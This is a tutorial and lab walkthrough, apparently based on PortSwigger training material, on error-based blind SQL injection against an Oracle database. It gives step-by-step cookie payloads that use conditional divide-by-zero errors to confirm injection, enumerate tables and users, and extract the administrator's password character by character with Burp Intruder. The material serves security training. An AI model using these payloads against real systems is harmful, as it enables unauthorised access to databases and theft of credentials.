# Error based blind

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data
from the database, even in blind contexts.
The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

1) You may be able to induce the application to return a specific error response based on the result of a boolean expression.
You can exploit this in the same way as the [conditional response](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses) we looked at in the previous section.
see [Exploiting blind SQL injection by triggering conditional errors.](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors).<br>
2) You may be able to trigger error messages that output the data returned by the query.
This effectively turns otherwise blind SQL injection vulnerabilities into visible ones.
For more information, see [Extracting sensitive data via verbose SQL error messages.](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)


To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
```bash
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```
```bash
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:<br>
1) With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
2) With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.
<br>
Using this technique, you can retrieve data by testing one character at a time:
```bash
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

# Lab

**1)** Visit web site, load and capture request using burp suite send it to repeater
**2)** Modify the TrackingId cookie, appending a single quotation mark to it:
```bash
TrackingId=xyz'
```
Verify error happened<br>
**3)** Now change it to two quotation marks:
```bash
TrackingId=xyz''
```
Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.<br>
**4)** You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
```bash
TrackingId=xyz'||(SELECT '')||'
```
In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
```bash
TrackingId=xyz'||(SELECT '' FROM dual)||'
```
As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all SELECT statements to explicitly specify a table name.<br>
**5)** Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
```bash
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```
This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.<br>
**6)** As long as you make sure to always inject syntactically valid SQL queries, you can use this error response to infer key information about the database. For example, in order to verify that the users table exists, send the following query:
```bash
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```
As this query does not return an error, you can infer that this table does exist. Note that the `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.<br>
**7)** You can also exploit this behavior to test conditions. First, submit the following query:
```bash
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Verify that an error message is received.<br>
**8)** Now change it to:
```bash
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```
Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true<br>
**9)** You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists:
```bash
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.<br>
**10)** The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:
```bash
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
This condition should be true(the error is received), confirming that the password is greater than 1 character in length.
We will continue to increase number when condition if false it means number of characters in password.<br>
**11)** To find content of password use:
```bash
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
If first character of password `a` we will recieve error. We can send it to burp intruder to extract all characters of password one by one.

## Perfect explanation from you tube:
URL: https://youtu.be/_7w-KEP_K5w
